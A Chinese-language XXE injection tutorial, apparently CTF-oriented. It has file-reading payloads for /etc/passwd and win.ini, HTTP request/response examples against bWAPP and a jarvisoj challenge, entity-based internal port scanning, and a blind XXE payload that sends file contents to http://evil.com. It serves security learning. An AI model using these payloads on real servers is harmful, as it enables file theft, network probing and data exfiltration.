@@ -1,0 +1,154 @@
+内部实体：
+
+<!ENTITY 实体名称 "实体的值">
+外部实体:
+
+<!ENTITY 实体名称 SYSTEM "URI">
+参数实体：
+
+<!ENTITY % 实体名称 "实体的值">
+或者
+<!ENTITY % 实体名称 SYSTEM "URI">
+实例演示：除参数实体外实体+内部实体
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE a [
+    <!ENTITY name "nMask">]>
+<foo>
+        <value>&name;</value> 
+</foo>
+实例演示：参数实体+外部实体
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE a [
+    <!ENTITY % name SYSTEM "file:///etc/passwd">
+    %name;
+]>
+注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。
+
+由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。
+
+外部实体
+外部实体即在DTD中使用
+
+<!ENTITY 实体名称 SYSTEM "URI">
+语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？
+主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：
+
+实例演示：
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE a [ //定义一个外部名称
+    <!ENTITY content SYSTEM "file:///etc/passwd">]> // SYSTEM "file:///xxxx"用于读取文件
+<foo> //定义标签 标签名可以随便输入，也可以和外名称对应
+        <value>&content;</value> 
+</foo>
+
+得带Content-Type: application/xml头，如果请求头类似于：Content-Type: application/json，那么可以改为Content-Type: application/xml试试有没有xml漏洞
+
+
+一个CTF题的XXE
+POST /bWAPP/xxe-2.php HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 115
+Origin: http://127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Referer: http://127.0.0.1/bWAPP/xxe-1.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: PHPSESSID=dbc10p5qcgt71mv0j12o16qis0; security_level=0
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE sb [
+ <!ENTITY xxe  "kkwdzfbsrbdztg">
+ ]>
+<sb>
+  &xxe;
+</sb>
+
+如果响应数据出现kkwdzfbsrbdztg，就代表存在XXE漏洞，如下：
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 27
+Server: Werkzeug/0.9.4 Python/2.7.6
+Date: Wed, 27 Nov 2019 13:21:10 GMT
+
+<em>
+  kkwdzfbsrbdztg
+</em>
+
+读取文件示例：
+POST /api/v1.0/try HTTP/1.1
+Host: web.jarvisoj.com:9882
+Content-Length: 128
+Origin: http://web.jarvisoj.com:9882
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
+Content-Type: application/xml
+Accept: */*
+Referer: http://web.jarvisoj.com:9882/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Connection: close
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 169
+Server: Werkzeug/0.9.4 Python/2.7.6
+Date: Wed, 27 Nov 2019 13:26:35 GMT
+
+<em>
+  Linux version 3.13.0-165-generic (buildd@lcy01-amd64-025) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.4) ) #215-Ubuntu SMP Wed Jan 16 11:46:47 UTC 2019
+
+</em>
+
+
+XML文档是用PHP进行解析的，那么还可以使用php://filter协议来进行读取。
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY content SYSTEM "php://filter/resource=c:/windows/win.ini">
+]>
+<root><foo>&content;</foo></root>
+
+端口扫描
+加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。
+
+私有类型DTD加载：
+
+<!ENTITY private_dtd SYSTEM "DTD_location">
+
+公共类型DTD加载：
+
+<!ENTITY public_dtd PUBLIC "DTD_name" "DTD_location">
+在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+    <!ENTITY portscan SYSTEM "http://localhost:3389">
+]>
+<root><foo>&portscan;</foo></root>
+
+
+blind xxe漏洞:
+对于传统的XXE来说，要求攻击者只有在服务器有回显或者报错的基础上才能使用XXE漏洞来读取服务器端文件，如果没有回显则可以使用Blind XXE漏洞来构建一条带外信道提取数据。
+利用DTD进行数据回显
+有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。
+
+ <?xml version="1.0" encoding="utf-8"?>
+ <!DOCTYPE root[    
+ <!ENTITY % file SYSTEM "php://fileter/convert.base64-encode/resource=c:/windows/win.ini">     
+ <!ENTITY % dtd SYSTEM "http://192.168.1.100:8000/evil.dtd">    
+ %dtd;     
+ %send;]>
+ <root></root>
+evil.dtd
+
+ <!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://evil.com/?content=%file;'>">
+ %payload;
+在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容
+
+
+参考链接：
+https://www.cnblogs.com/vincebye/p/7199290.html
+https://www.freebuf.com/articles/web/177979.html
